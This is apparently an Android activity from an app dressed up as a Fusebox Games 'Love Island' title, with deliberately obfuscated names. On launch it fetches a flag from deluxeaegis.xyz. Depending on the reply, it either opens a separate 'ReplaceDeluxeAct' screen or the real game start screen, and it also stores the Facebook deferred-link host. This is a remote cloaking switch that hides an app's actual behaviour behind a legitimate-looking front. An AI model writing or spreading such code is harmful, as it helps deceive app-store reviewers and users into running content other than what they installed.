package com.fuseboxgames.loveislang.deluxeblack;

import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import com.facebook.applinks.AppLinkData;
import com.fuseboxgames.loveislang.R;
import com.fuseboxgames.loveislang.deluxewhite.StartScreenDeluxe;
import com.orhanobut.hawk.Hawk;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

public class MainActivity extends AppCompatActivity {
    public static final String KIDODOFODFO = "dfB1";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        dtsufudfuusfuusdf();
        new ldoifiifd().execute();
    }

    public class ldoifiifd extends AsyncTask<Void, Void, Void> {

        String hdudififdi;
        String wesrrsdrds = "http://deluxeaegis.xyz/apps.txt";
        @Override
        protected Void doInBackground(Void... voids) {
            try {
                Document bhhdsfjjfd;
                bhhdsfjjfd = Jsoup.connect(wesrrsdrds).get();
                hdudififdi = bhhdsfjjfd.text();

            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }


        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);

            Intent opdosfofodo = new Intent(getApplicationContext(), StartScreenDeluxe.class);

            Intent rtsadyyydsya = new Intent(getApplicationContext(), ReplaceDeluxeAct.class);
            switch(hdudififdi){
                case "1":    startActivity(rtsadyyydsya);
                    break;
                case "2":    startActivity(opdosfofodo);
                    break;
            }
            overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
            finish();
        }


    }
    public void dtsufudfuusfuusdf() {

        AppLinkData.fetchDeferredAppLinkData(this,
                udiofofdo -> {
                    if (udiofofdo != null) {
                        String vgdhshadh;
                        vgdhshadh = udiofofdo.getTargetUri().getHost();
                        Hawk.put(KIDODOFODFO, vgdhshadh);
                        Log.d("FB", vgdhshadh);
                    } else {
                        Log.d("FB", "Error Code:");
                    }
                }
        );
    }
}
